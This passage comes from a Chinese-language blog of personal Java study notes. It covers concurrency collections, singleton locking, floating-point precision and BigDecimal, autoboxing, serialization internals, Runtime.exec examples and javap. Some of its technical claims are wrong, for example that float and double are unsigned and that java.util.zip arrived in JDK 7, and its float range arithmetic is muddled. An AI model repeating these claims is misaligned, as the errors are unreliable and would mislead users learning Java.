oldValue = get(elements, index); if (oldValue != element) { int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len); //即CopyOnWrite newElements[index] = element; setArray(newElements); } else { // Not quite a no-op; ensures volatile write semantics setArray(elements); } return oldValue; } finally { lock.unlock(); } } CopyOnWriteArrayList内部ListIterator直接保存了一份final的之前Array的snapShot，由于是volatile，任何读操作都能读取到实时的array数据。所谓读取是安全的是指读的时候始终读到的是最实时的信息，这个通过volatile 就能保证。写入由于加锁了，所以也是线程安全的。 9.float和long这些相互除法，会出现精确度损失6.8040496E7*100/68040488f 会出现1.000001这种东西 10. int居然还可以这么写 int a = 5_372_4323; 下划线只是为了具有更好的可读性，added in java 7 11.java nio是java1.4引入的适合连接数高的并发处理1.nio做了内存映射，少了一次用户空间和系统空间之间的拷贝2.nio是异步，触发式的响应，非阻塞式的响应，充分利用了系统资源，主要是cpu 12.微观(macro)层面的性能要点 List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; list.size(); i++) { //do stuff } //下面这种才是正确的方法 List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0,size = list.size(); i&lt;size; i++) { //do stuff } 在字节码层面，list.size是通过invokeInterface实现的，这个过程实际上需要根据”size（）”这个方法名称计算出对应的hash值，然后去方法区缓存里面查找这个方法的对应实现。hash计算一次无所谓，计算多次总归比计算一次要浪费时间。 13. inline Function编译器层面做的优化inline。主要是省去不必要的一次函数调用 14.json解析器推荐报出的错误稍微看下还是能懂的例如：gson-throwing-expected-begin-object-but-was-begin-array 问题就在于，String形式的json没问题，自己这边写的对应映射class结构写错了，一个变量其实是object，自己在class里面写成了array(list).一般的解析器会allocate一大堆String然后丢掉，moshi会根据binary data做好cache，每一个key只会创建一次。所以速度很快。这一点jake Wharton和Jesse Wilson在一次会议上提到过.另外，jsonArray的String长这样”[{},{}]”,jsonObject的String长这样”{key1:value1,key2:value2}”. 经常会不确定。 15. Collections.unmodifiableList的出现是有道理的还记得Arrays.asList返回的并不是java.util.ArrayList。并不支持add,remove(丢unSupportedOperationException).但支持set,get。为了把List变成彻底只读的，就得用Collections的这个方法。原理上就是在get和set里面也丢异常出来。 16. 单例模式，双重锁检查单例模式怎么写，一般的答案就是双重检查 class Foo { private Helper helper; public Helper getHelper() { if (helper == null) { synchronized(this) { if (helper == null) { //可能指针不为空，但指向的对象还未实例化完成 helper = new Helper(); } } } return helper; } } 除非在单例前面加上volatile，否则上述单例模式并不安全。infoQ也有解释正确答案参考知乎答案:知乎用户 是因为指令重排造成的。直接原因也就是 初始化一个对象并使一个引用指向他 这个过程不是原子的。导致了可能会出现引用指向了对象并未初始化好的那块堆内存，使用volatile修饰对象引用，防止重排序即可解决。推荐使用内部静态类做延时初始化，更合适，更可靠。这个同步过程由JVM实现了。 17.函数的执行顺序，由此带来的性能影响Log.Debug(&quot;list is &quot;+list) //传一个list进去，list的长度未知 其实应该改为 Log.debug(() -&gt; &quot;list is&quot;+list) //这个方法接受一个Supplier&lt;String&gt; 区别在于，前者无论是否DEBUG都会去创建一个String，后者只是提供了如何创建String的思路，并没有真的创建。 18.inline的解释这种说辞更多见于C或者C++,java里面，例如 String s = &quot;someThing&quot;; System.out.println(s.length()) //可以改成 System.out.println(&quot;something&quot;.length()) // 这就叫inline，没必要多创建一根指针出来 一种说法是，一个method只被用了一次，完全没必要声明这个method，vm调用method需要invokestatic或者invokeInterface,提取出来省掉这部分消耗。据说有些vm可以自动做好这部分优化。 19. for loop的写法int i = 0; for (; i &lt; 10; i++) { // do stuff here } 这么写也是可以的，其实很像 for (;;) {} 解释,这跟while(true)是一样的。 java7的enhanced for loop只是一个syntax sugar: List&lt;String&gt; somelist = new ArrayList&lt;&gt;();//右边只有两个&lt;&gt;是jdk7出现的diamond operator。 for (Iterator&lt;String&gt; i = someList.iterator(); i.hasNext();) { String item = i.next(); System.out.println(item); } //由于实在是一样的东西，intellij idea里面会变黄色，提醒 replace with for each // debug 一下确实发现 hasNext和next方法在每一个循环都被调用了 20. 关于泛型一般泛型要这么写： class A 或者class B 实际上IDE不在乎选择了什么字母，所以可以这么写： class A 这样写完全没问题 21.子类和父类的关系子类里面写一个和父类一样名字的变量，会把父类protected变量的值冲刷掉； public class FatherClass { protected int mId; } public class ChildClass extends FatherClass { private int mId; public static void main(String[] args) { FatherClass fatherClass = new ChildClass(); fatherClass.mId = 10; System.out.println(fatherClass.mId); //10 ChildClass childClass = (ChildClass) fatherClass; childClass.mId = 20; System.out.println(fatherClass.mId); //10 System.out.println(childClass.mId); //20 } } 输出 10 10 20 换成 public class ChildClass extends FatherClass { private int mId; public static void main(String[] args) { ChildClass fatherClass = new ChildClass(); fatherClass.mId = 10; System.out.println(fatherClass.mId); ChildClass childClass = (ChildClass) fatherClass; childClass.mId = 20; System.out.println(fatherClass.mId); System.out.println(childClass.mId); } } 输出 10 20 20 所基本上就是，把一个对象当成什么class来用，操作的范围就在这个层面造成影响；debug会看见两个变量mId和FatherClass.mId，所以完全是两个int。 调用父类被override的方法，目测只能用super.someMethod() 22.打印出一个方法执行到这里的方法栈 Thread.dumpStack();还有，e.printStakTrace是非常昂贵的 23. try with resource(since jdk 7)Joshua Bloch设计了jdk7中的try with resource特性。在程序开发中，代表资源的对象，一般用完了需要及时释放掉。例如，jdk7之前 static String readFirstLineFromFileWithFinallyBlock(String path) throws IOException { BufferedReader br = new BufferedReader(new FileReader(path)); try { return br.readLine(); } finally { if (br != null) br.close(); } } 放在finally里面就是确保资源能够被释放掉jdk7之后 static String readFirstLineFromFile(String path) throws IOException { try (BufferedReader br = new BufferedReader(new FileReader(path)) { return br.readLine(); } } jdk7添加了AutoCloseable接口，当try语句块运行结束时，BufferReader会被自动关闭。即会自动调用close方法，假如这个close方法抛出异常，异常可以通过Exception.getSuppressed获得，所以这里面的Exception是try语句块里面抛出来的。oracle给出的解释其实跟python很像: with open(&#39;&#39;,&#39;wb+&#39;) as f: f.read() with urllib.request.urlopen(url) as u: page = u.read() print(len(page)) 会自动完成文件的关闭或者socket的关闭 24. java提供了文件zip功能的接口jdk7开始添加了java.util.zip包。 25. String为什么要设计成final的解释非常多有人猜测Java想用这种方式让String在形式上成为一种基本数据类型，而不是一个普通的类。确实String基本在所有的类中都用到了。 26.从Exploring java’s hidden cost得到的在intellij中，Setting -&gt; Editor -&gt; Inspection -&gt; Synthetic accessor callThe docs explains as these:&gt;This inspection is intended for J2ME and other highly resource constrained environments. Applying the results of this inspection without consideration might have negative effects on code clarity and design.Reports references to non-constant private members of a different class, for which javac will generate a package-private synthetic accessor method.An inner class and its containing class are compiled to separate class files. The Java virtual machine normally prohibits access from a class to private fields and methods of another class. To enable access from an inner class to private members of a containing class or the other way around javac creates a package-private synthetic accessor method. Less use of memory and greater performance may be achieved by making the member package-private, thus allowing direct access without the creation of a synthetic accessor method. There ‘s no actual inner class’ 27. abstract class可以没有抽象方法Why use an abstract class without abstract methods? 28. 一般说map迭代读取的顺序和存进去的顺序是不一样的（有例外）文档是这样说的：LinkedHashMap: “with predictable iteration order […] which is normally the order in which keys were inserted into the map (insertion-order).”HashMap: “makes no guarantees as to the order of the map”TreeMap: “is sorted according to the natural ordering of its keys, or by a Comparator”实际开发中想要有序就用LinkedHashMap。但是 HashMap&lt;String, Integer&gt; map = new HashMap&lt;&gt;(10); map.put(&quot;A&quot;, 1); map.put(&quot;B&quot;, 2); map.put(&quot;C&quot;, 3); map.put(&quot;D&quot;, 4); map.forEach((s, integer) -&gt; System.out.println(&quot;key = &quot;+s+&quot; value is &quot;+integer)); 实际是有序的，文档是说[no guarantees]。看下源码，其实是在Hashmap算hashcode的时候，String的hashCode比较耿。。。Stuart Mark提到了这一点，并希望开发者不要寄希望于这种edge case。 29. 自动装箱使用不小心会造成NullPointerException参考 public class Test { public static long test(long value) { return value; } public static void main(String[] args) { Long value = null; //因为null不能被Boxing，所以崩了 // ... test(value); } } 其实重点在于看javap -c 生成的字节码 [ternary operator也会造成npe]三目运算符会隐式转型(https://stackoverflow.com/questions/25996591/java-ternary-operator-npe-autoboxing-string) This is happening because the type return by a ternary operator is the type of the first returned value. In this case, that’s the primitive value false. So Java is trying to take the primitive boolean returned by the ternary operator, then use autoboxing to convert it to a wrapper Boolean. But then you return a null from the ternary operator. And then when Java tries to autobox it, it throws an NPE because null can’t be autoboxed. You should either use wrapper Booleans as the values in the ternary operator, or restructure this using if statements. 简单来讲，ternary operator返回值的类型是第一个return值的类型(在这里就是boolean)，但返回一个Null的话，null并不能被autoBoxing，所以崩了。 30. 假如没有override hashCode方法，那么deug里面看到的是什么？@HotSpotIntrinsicCandidate public native int hashCode();//是一个native方法 默认返回内存中的地址其实也不能真当做是内存地址 System.identityHashCode()方法返回的内容是vm 的implementation detail（亦即不同vm之间的实现方式可能不同），虽然多数时候这个值是object的initial memory address。但vm随时可能把这个object挪走，所以Getting the memory addresses of variables is meaningless within Java。 System.identityHashCode返回的形式是1360875712这样的十进制的int，需要转成2进制Integer.toBinaryString 31. 接口里面放一个接口这种事情也不是没干过android.content.DialogInterface.java public interface DialogInterface { public static final int BUTTON_POSITIVE = -1; public static final int BUTTON_NEGATIVE = -2; public static final int BUTTON_NEUTRAL = -3; public void cancel(); public void dismiss(); interface OnCancelListener { public void onCancel(DialogInterface dialog); } interface OnDismissListener { public void onDismiss(DialogInterface dialog); } interface OnShowListener { public void onShow(DialogInterface dialog); } interface OnClickListener { public void onClick(DialogInterface dialog, int which); } interface OnMultiChoiceClickListener { public void onClick(DialogInterface dialog, int which, boolean isChecked); } interface OnKeyListener { public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event); } } 接口里面放常量也行啊 32.Stuart Marks又提到了写comparatr时可能出现的错误Comparison Method Violates Its General Contract! (Part 1) by Stuart Marks 33. java也是有二维数组的34. 在运行时得这么拿注解代码出自深入理解Java：注解（Annotation）–注解处理器 /** * 水果名称注解 * @author peida * */ @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface FruitName { String value() default &quot;&quot;; } /** * 水果颜色注解 * @author peida * */ @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface FruitColor { /** * 颜色枚举 * @author peida * */ public enum Color{ BULE,RED,GREEN}; /** * 颜色属性 * @return */ Color fruitColor() default Color.GREEN; } /** * 水果供应者注解 * @author peida * */ @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface FruitProvider { /** * 供应商编号 * @return */ public int id() default -1; /** * 供应商名称 * @return */ public String name() default &quot;&quot;; /** * 供应商地址 * @return */ public String address() default &quot;&quot;; } /***********注解使用***************/ public class Apple { @FruitName(&quot;Apple&quot;) private String appleName; @FruitColor(fruitColor=Color.RED) private String appleColor; @FruitProvider(id=1,name=&quot;陕西红富士集团&quot;,address=&quot;陕西省西安市延安路89号红富士大厦&quot;) private String appleProvider; public void setAppleColor(String appleColor) { this.appleColor = appleColor; } public String getAppleColor() { return appleColor; } public void setAppleName(String appleName) { this.appleName = appleName; } public String getAppleName() { return appleName; } public void setAppleProvider(String appleProvider) { this.appleProvider = appleProvider; } public String getAppleProvider() { return appleProvider; } public void displayName(){ System.out.println(&quot;水果的名字是：苹果&quot;); } } /***********注解处理器***************/ public class FruitInfoUtil { public static void getFruitInfo(Class&lt;?&gt; clazz){ String strFruitName=&quot; 水果名称：&quot;; String strFruitColor=&quot; 水果颜色：&quot;; String strFruitProvicer=&quot;供应商信息：&quot;; Field[] fields = clazz.getDeclaredFields(); for(Field field :fields){ if(field.isAnnotationPresent(FruitName.class)){ FruitName fruitName = (FruitName) field.getAnnotation(FruitName.class); strFruitName=strFruitName+fruitName.value(); System.out.println(strFruitName); } else if(field.isAnnotationPresent(FruitColor.class)){ FruitColor fruitColor= (FruitColor) field.getAnnotation(FruitColor.class); strFruitColor=strFruitColor+fruitColor.fruitColor().toString(); System.out.println(strFruitColor); } else if(field.isAnnotationPresent(FruitProvider.class)){ FruitProvider fruitProvider= (FruitProvider) field.getAnnotation(FruitProvider.class); strFruitProvicer=&quot; 供应商编号：&quot;+fruitProvider.id()+&quot; 供应商名称：&quot;+fruitProvider.name()+&quot; 供应商地址：&quot;+fruitProvider.address(); System.out.println(strFruitProvicer); } } } } /***********输出结果***************/ public class FruitRun { /** * @param args */ public static void main(String[] args) { FruitInfoUtil.getFruitInfo(Apple.class); } } ==================================== 水果名称：Apple 水果颜色：RED 供应商编号：1 供应商名称：陕西红富士集团 供应商地址：陕西省西安市延安路89号红富士大厦 35 .四舍五入问题，BigDecimal,BigInteger这些基本数据类型中float和double只能用于处理科学运算或者工程计算，商业应用中，需要使用BigDecimal来处理。 System.out.println(0.06 + 0.01); System.out.println(1.0 - 0.42); System.out.println(4.015 * 100); System.out.println(303.1 / 1000); //下面是实际输出，显然是不对的 // 0.06999999999999999 // 0.5800000000000001 // 401.49999999999994 // 0.30310000000000004 double a = 4887233385.5; double b = 0.85; BigDecimal a1 = new BigDecimal(a); BigDecimal b1 = new BigDecimal(b); System.out.println(&quot;==============================================================&quot;); System.out.println(a*b); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1));//result2--&gt;4154148377.674999891481619374022926649558939971029758453369140625无限不循环,其实后面还有 System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(1, RoundingMode.HALF_UP)); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(5, RoundingMode.HALF_UP)); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(9, RoundingMode.HALF_UP)); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(11, RoundingMode.HALF_UP)); System.out.println(&quot;==============================================================&quot;); 以下为实际输出 ==============================================================4.1541483776749997E9 //科学计数法在这种场景下几乎没法用（注意默认给出了16位，下面有解释）result2–&gt;4154148377.674999891481619374022926649558939971029758453369140625 //这个是实际值result2–&gt;4154148377.7result2–&gt;4154148377.67500result2–&gt;4154148377.674999891 result2–&gt;4154148377.67499989148实在靠谱的四舍五入 RoundingMode.HALF_EVEN就是把这个小数化为离它最近的偶数RoundingMode.HALF_UP 就是碰到五就往上进一位RoundingMode.HALF_DOWN 就是碰到五就视为0RoundingMode.FLOOR 和Math.floor差不多RoundingMode.CEILING 和Math.ceiling差不多core Library的命名都很易懂 由此引申出： System.out.println( 0.9999999f==1f ); // 7个9 System.out.println( 0.99999999f==1f ); //8个9 System.out.println( 0.999999999f==1f ); // 9个9 // false // true // true Java 浮点数 float和double类型的表示范围和精度和整数型是signed的不一样,float和double是unsigned。这32位是怎么分的：1bit（符号位） 8bits（指数位） 23bits（尾数位）（内存中就长这样）double占据64bit。1bit（符号位） 11bits（指数位） 52bits（尾数位）（内存中就长这样） 所以float的指数范围是-128~127 。(2的8次方)double的指数范围为-1024~+1023。再具体点：float的范围为-2^128 ~ +2^127，也即-3.40E+38 ~ +3.40E+38； update : From 3.402,823,5 E+38 to 1.4 E-45(由于是unsigned，这只是正数部分) the correct way: [-3.40E+38,-1.4 E-45 ] &amp;&amp; [1.4 E-45, +3.40E+38] ## 站在十进制的角度来看，是相对于0对称的两个区间。整个实数轴并未完全覆盖。 很多人都说这些最大值最小值不用记，对应的包装类都有常量MIN_VALUE和MAX_VALUE。然而，这个还是有些需要注意的。Float.MIN_VALUE 并不是负数，而是一个0.00000XXX 的小数。一般认为这个常量应该起一个更合适的名字，另外不要把Float.MIN_VALUE和Float.MIN_NORMAL搞混淆； // Float public static final float MIN_NORMAL = 0x1.0p-126f; // 1.17549435E-38f // 这个是2^-126=1.175494350822..(注意小数点后的值就没有了，实在表示不了) public static final float MIN_VALUE = 0x0.000002P-126f; // 1.4e-45f 真正的MIN_VALUE应该是MAX_VALUE的负值 public static final float MAX_VALUE = 0x1.fffffeP+127f; // 3.4028235e+38f //这个max倒是起名起的很好 // 怎么算的 拿个计算器算下：2^128 = 3.402823669209...。是不是小数点后第七位就不对了，这个就看上面的23bit了 // Double public static final double MAX_VALUE = 0x1.fffffffffffffP+1023; // 1.7976931348623157e+308 //这个确实是最大值 public static final double MIN_NORMAL = 0x1.0p-1022; // 2.2250738585072014E-308 public static final double MIN_VALUE = 0x0.0000000000001P-1022; // 4.9e-324 -Double.MAX_VALUE才是你能用double表示的最小值 Float.MAX_VALUE + 1 == Float.MAX_VALUE // true MIN_VALUE和NIN_NORMAL的区别float和double最终在内存中都是以a^n次方来表示为十进制数值的。以float为例来解释下：float一共32bit，就是32个槽子，第一个拿来表示符号(unsigned)，那还剩下31个，最终要用剩下的31个bit表示出一个科学计数法的Decimal.上面说了，8个用来表示指数，也就是2^8 = 128，也就是指数方面最小是-127，最大是128。也就是说上面那个a^n的n的范围是[-127,128]。根据stackoverFlow的解释，MIN_NORMAL就是二进制小数点前有一个1开头的，MIN_VALUE就是可以用0开头的所以就是23个槽子前22个都放了0，最后一个放了1，也就是十进制的2，算上指数层的-127，也就是2乘以2^-127 = 2^-126，论MIN_NORMAL是怎么来的。还剩下32-1-8 = 23个，用来表示确切的值， 2^23 = 8388608(7个数字，所以7个数字保不准，但6个是有把握的，让7位给指数位吧，把10的-38次方变成10的-45次方)。也就是说上面个a^n的a的范围是[1,8388608]，论MIN_VALUE是怎么来的。 double和float都属于The IEEE 754 format has one bit reserved for the sign and the remaining bits representing the magnitude. double的范围为-2^1024 ~ +2^1023，也即-1.79E+308 ~ +1.79E+308。就这么算出来的。至于float里面那剩下的23位和double里面剩下的52位，是用来表示精度的。 float：2^23 = 8388608，一共七位，由于最左为1的一位省略了，这意味着最多能表示8位数： 2*8388608 = 16777216 。有8位有效数字，但绝对能保证的为7位，也即float的精度为7~8位有效数字；double：2^52 = 4503599627370496，一共16位，同理，double的精度为16~17位。 所以上面出现了小数点后最多16位的double。所以上面的java代码还可以想到： System.out.println( 0.9999999f==1f ); // 7个9 System.out.println( 0.99999999f==1f ); //8个9 System.out.println( 0.9999999996666666f==1f ); // 9个9 当一个float小数的小数点后位数超出了8个之后，java就无法用float表示这后面的数字了。应该说一个float数据类型能够保证不损失精度的限制就是有效数字6-7位（6个是准的，7个不好说）。所以上面的第8个9之后写什么都是true的。随手写一个 float aa = 1123456789123456f; float bb = 1123456789123456.1f; System.out.println(aa==bb); // ide自动飚黄，显示always 为true 不要以为自己真的想要多少就有多少，float后面最多使用8位有效数字，double最多能表示16位有效数字。为什么，数学这么说的。这么说吧，从整个数轴来看，整个数轴最左边和最右边都是接触不到的。另外，0左右各有一小块宽度为0.0000000xxx的小范围是表示不了的。就算是已经覆盖到的位置，计算机这种二进制表达的方式只是零零散散的占据了很少的一部分。 float f = 2.2f; double d = (double) f; System.out.println(d); f = 2.25f; d = (double) f; System.out.println(d); 输出： 2.2000000476837162.25 这样的问题也能够理解了，给你32个bit，第一位表示正负，第2-9位表示指数，剩下23位表示实际的数字。对于2.2f，首先第一位表示正负，然后个位数2可以表示在第二位，剩下的0.2设法用22位表示。 来看十进制小数转换二进制的问题，例如：22.8125转二进制 整数和小数分别转换。整数除以2，商继续除以2，得到0为止，将余数逆序排列。22 / 2 11 余011/2 5 余 15 /2 2 余 12 /2 1 余 01 /2 0 余 1所以22的二进制是10110小数乘以2，取整，小数部分继续乘以2，取整，得到小数部分0为止，将整数顺序排列。0.8125x2=1.625 取整1,小数部分是0.6250.625x2=1.25 取整1,小数部分是0.250.25x2=0.5 取整0,小数部分是0.50.5x2=1.0 取整1,小数部分是0，结束所以0.8125的二进制是0.1101十进制22.8125等于二进制10110.1101 对于0.2来说，得到的是一个无线循环的00110011001100110011….区区23位怎么够用。所以23位之后的数字被无视了，然后打印的时候尝试将这仅有的23位0101表示成10进制的时候，无论如何是得不到跟数学意义上的数字相等的数。但对于机器来说，就是一样的，Intelij里面float超过小数点后8位自动飚黄，说什么is always true。。。就这么23个槽子，确实没法满足实际需要的位数要求。所以实际上是2.2f需要无限个小槽子表示，2.25f正好停在：0 100 0000 0001 0010 0000 0000 0000 0000 就够用了。有时候float或者double的位数不够了，就用String吧。BigDecimal提供了String为参数的初始化方法。 double currentLat2 = 2.455675; BigDecimal b = new BigDecimal(currentLat2); currentLat2 = b.setScale(5, BigDecimal.ROUND_HALF_UP).doubleValue(); System.out.println(currentLat2); // 输出的是2.45567而不是2.45568 String currentLat2 = &quot;2.455675&quot;; BigDecimal b = new BigDecimal(currentLat2); System.out.println(b.setScale(5,BigDecimal.ROUND_HALF_UP).doubleValue()); 所以建议用String初始化BigDecimal. Floating point precision error这种事几乎所有语言都有 type -casting java中从double强转float，从long强转int是怎么实现的 36.调jvm参数先看怎么get:在Intelij里面，写一个helloworld程序，看下console的输出，然后复制出来。中间加上这么一行： -XX:+PrintFlagsFinal and -XX:+PrintFlagsInitial 打印出来的东西很长，在console中不好找，最好拿管道复制出来: XXXXX | clip 。然后在文本编辑器中粘贴，自己找想要的参数挑几个好玩的： InitialHeapSize = 132120576 MaxJavaStackTraceDepth = 1024 具体教程搜索打印jvm参数即可。 再看怎么set:Intelij里面，Setting-Build-maven-runner，有个VM Options。把网上找到的“jvm 参数粘贴进去”。比如这些 -Xmx3550m:设置JVM最大可用内存为3550M. -Xms3550m:设置JVM促使内存为3550m.此值可以设置与-Xmx相同,以避免每次垃圾回收完成后JVM重新分配内存. -Xmn2g:设置年轻代大小为2G. 37. Serializable的原理刚学java的时候没人会跟你讲Serializable为什么是一个没有抽象方法的接口，那时甚至不知道serialize和deserialize是怎么回事。关于Serializable主要的点有几个： 为什么一个没有抽象方法的接口也能算接口 为什么总是说序列化一定要实现serializable接口 那个serialVersionUID干什么用的 为什么写了transient就不会被序列化了。 现在回答下这些问题，serialize（序列化，就是把一个对象写进磁盘），deserialize（反序列化，就是把写在磁盘上的0110这些东西重新组装成一个对象）。 public interface Serializable { } private static final long serialVersionUID = 2906642554793891381L; // 网上随便找到的序列化和反序列化的demo如下 // Serializable：把对象序列化 public static void writeSerializableObject() { try { Man man = new Man(&quot;lat&quot;, &quot;123456&quot;); Person person = new Person(man, &quot;王尼玛&quot;, 21); ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;output.txt&quot;)); objectOutputStream.writeObject(&quot;string&quot;); objectOutputStream.writeObject(person); objectOutputStream.close(); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } // Serializable：反序列化对象 public static void readSerializableObject() { try { ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;output.txt&quot;)); String string = (String) objectInputStream.readObject(); Person person = (Person) objectInputStream.readObject(); objectInputStream.close(); System.out.println(string + &quot;, age: &quot; + person.getAge() + &quot;, man username: &quot; + person.getMan().getUsername()); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (Exception e) { e.printStackTrace(); } } 为什么说序列化一定要实现serializable接口。上面的objectOutputStream.writeObject方法走进去。ObjectOutputStream.java public final void writeObject(Object obj) throws IOException { if (enableOverride) { writeObjectOverride(obj); return; } try { writeObject0(obj, false); } catch (IOException ex) { if (depth == 0) { writeFatalException(ex); } throw ex; } } private void writeObject0(Object obj, boolean unshared) throws IOException{ // 省略省略 // remaining cases if (obj instanceof String) { writeString((String) obj, unshared); } else if (cl.isArray()) { writeArray(obj, desc, unshared); } else if (obj instanceof Enum) { writeEnum((Enum&lt;?&gt;) obj, desc, unshared); } else if (obj instanceof Serializable) { writeOrdinaryObject(obj, desc, unshared); } else { if (extendedDebugInfo) { throw new NotSerializableException( cl.getName() + &quot;\\n&quot; + debugInfoStack.toString()); } else { throw new NotSerializableException(cl.getName()); } } // 省略省略 } 果然还是用了instanceof这个关键词啊。这是写进磁盘(serialize的情况)，从磁盘里取出来的话ObjecInputStream.java public final Object readObject(){ // 省略 Object obj = readObject0(false); // 省略 } /** * Underlying readObject implementation. */ private Object readObject0(boolean unshared) throws IOException { // 省略 case TC_OBJECT: return checkResolve(readOrdinaryObject(unshared)); // 省略 } private Object readOrdinaryObject(boolean unshared){ //省略 try { obj = desc.isInstantiable() ? desc.newInstance() : null; } catch (Exception ex) { throw (IOException) new InvalidClassException( desc.forClass().getName(), &quot;unable to create instance&quot;).initCause(ex); } //省略 } 就是反射调用无参的构造函数。 以前我问过那个serialVersionUID是干什么的，怎么写，老手告诉我说，瞎写就行了。后来的项目中就一直瞎写了，倒也没出过什么问题。现在来回答这个serialVersionUID是干什么的：序列化和反序列化就是存进去和取出来，为了保证存进磁盘的A在取出来的时候不会去拿B的二进制数据，所以需要这个。这个值就相当于每一个存进去的class的身份证号，保证存进去和取出来的是一个东西。ObjectStreamClass.java private static Long getDeclaredSUID(Class&lt;?&gt; cl) { try { Field f = cl.getDeclaredField(&quot;serialVersionUID&quot;); int mask = Modifier.STATIC | Modifier.FINAL; if ((f.getModifiers() &amp; mask) == mask) { f.setAccessible(true); return Long.valueOf(f.getLong(null)); } } catch (Exception ex) { } return null; } 假如忘记写的话，呵呵 throw new InvalidClassException(osc.name, &quot;local class incompatible: &quot; + &quot;stream classdesc serialVersionUID = &quot; + suid + &quot;, local class serialVersionUID = &quot; + osc.getSerialVersionUID()); 没有指定serialVersionUID的，那么java编译器会自动给这个class进行一个摘要算法，类似于指纹算法，只要这个文件多一个空格，得到的UID就会截然不同的，可以保证在这么多类中，这个编号是唯一的。所以，我们添加了一个字段后，由于没有显指定serialVersionUID，编译器又为我们生成了一个UID，当然和前面保存在文件中的那个不会一样了，于是就出现了2个号码不一致的错误。因此，只要我们自己指定了serialVersionUID，就可以在序列化后，去添加一个字段，或者方法，而不会影响到后期的还原，还原后的对象照样可以使用，而且还多了方法可以用 所以还是得老老实实写，而且一次写了之后就不用也不要改了现在可以不用瞎写了，在Intelij里面有小工具： &quot;File-&gt;Setting-&gt;Editor-&gt;Inspections-&gt;Serialization issues-&gt;Serializable class without ’serialVersionUID’ -&gt;勾选操作&quot; 38. java中Process的Api关键词：ProcessBuilder , java9提供了新的Api。另外还有Runtime.exec这个方法亲测，下面的命令可以在mac上执行uname -a 命令 //用ProcessBuilder是一种做法 try { Runtime r = Runtime.getRuntime(); Process p = r.exec(&quot;uname -a&quot;); p.waitFor(); BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = &quot;&quot;; while ((line = b.readLine()) != null) { System.out.println(line); } b.close(); }catch (IOException | InterruptedException e){ } // 下面这个也行 String s = null; try { // run the Unix &quot;ps -ef&quot; command // using the Runtime exec method: Process p = Runtime.getRuntime().exec(&quot;ps -ef&quot;); BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream())); BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream())); // read the output from the command System.out.println(&quot;Here is the standard output of the command:\\n&quot;); while ((s = stdInput.readLine()) != null) { System.out.println(s); } // read any errors from the attempted command System.out.println(&quot;Here is the standard error of the command (if any):\\n&quot;); while ((s = stdError.readLine()) != null) { System.out.println(s); } System.exit(0); } catch (IOException e) { System.out.println(&quot;exception happened - here&#39;s what I know: &quot;); e.printStackTrace(); System.exit(-1); } 只不过很少见过用java去调用系统接口的 39. javap一般用来反编译class文件 javap Animal.classjavap -c Animal.class //直接看字节码javap -help 可以看更多命令行参数的含义 不过一般不这么直接看字节码，因为都是有规则的，已经有人做出了gui的工具，比如jad ./jad -sjava Animal.class public enum Animal { DOG,CAT } // 通过jad翻译过后的字节码其实长这样 public final class Animal extends Enum { public static Animal[] values() { return (Animal[])$VALUES.clone(); } public static Animal valueOf(String s) { return (Animal)Enum.valueOf(Animal, s); } private Animal(String s, int i) { super(s, i); } public static final Animal DOG; public static final Animal CAT; private static final Animal $VALUES[]; static { DOG = new Animal(&quot;DOG&quot;, 0); CAT = new Animal(&quot;CAT&quot;, 1); $VALUES = (new Animal[] { DOG, CAT }); } } 40. 关于动态代理(InvocationHandler这一套)动态代理。 System.getProperties().put(“sun.misc.ProxyGenerator.saveGeneratedFiles”, “true”); 动态原理的newProxyInstance最终调用到了defineClass0,就是根据代理类的字节码生成代理类的实例（就是遍历目标类实现的接口，生成代理类的字节码byte[]） 41. java io主要是装饰模式，另外，调用操作系统api实现读写文件的功能在FileInputStream和FilePutputStream里面，主要的native方法都在这里面，FileDescriptor的使用也在这里面 // FileInputStream.java private native int read0() throws IOException; private native int readBytes(byte b[], int off, int len) throws IOException; private native void close0() throws IOException; //FileOutputStream.java private native void write(int b, boolean append) throws IOException; private native void writeBytes(byte b[], int off, int len, boolean append) throws IOException; private native void close0() throws IOException; 42. Using java from command line interface平时都被IDE宠坏了，习惯了用Intelij Idea跑java 程序，如果用命令行呢？ java -h 会告诉我们可以通过java command传递的参数。看了下Intelij Idea点击run的时候做了什么: 首先是一闪而过的compiling…..(其实就是跑javac了)，然后在console里面开始输出：”java.exe的绝对路径” “-javaagent:xxx.jar” -Dfile.encoding=UTF-8 -classpath “/jre/lib/A.jar;/jre/lib/B.jar;…..;/target/classes(这个是ide在当前项目目录下创建的一个文件夹，里面按照包名结构放了对应的class文件);C:/users/administrator/.m2/repository/com.xxx.xxx.jar;……” com.example.sample java - h说 -D&lt;名称&gt;=&lt;值&gt; 设置系统属性-javaagent:[=&lt;选项&gt;] 加载 Java 编程语言代理, 请参阅 java.lang.instrument-classpath &lt;目录和 zip/jar 文件的类搜索路径&gt;用 ; 分隔的目录, JAR 档案和 ZIP 档案列表, 用于搜索类文件。 记住,javac只是一个utlity that comes with JDK 错误: 找不到或无法加载主类两种正确的方案是： java文件中不写packagename!不写packagename!不写packagename! public class Demo { public static void main(String[] args) { System.out.println(&quot;Hello there&quot;); } } 然后命令行javac Demo.java -&gt; java Demo -&gt; Hello there java文件写上packageName package com.me.example; public class Demo2 { public static void main(String[] args) { System.out.println(&quot;Hello there&quot;); } } 然后javac Demo2.java -&gt; java Demo2 -&gt; 错误: 找不到或无法加载主类 com.me.example.Demo2应该javac 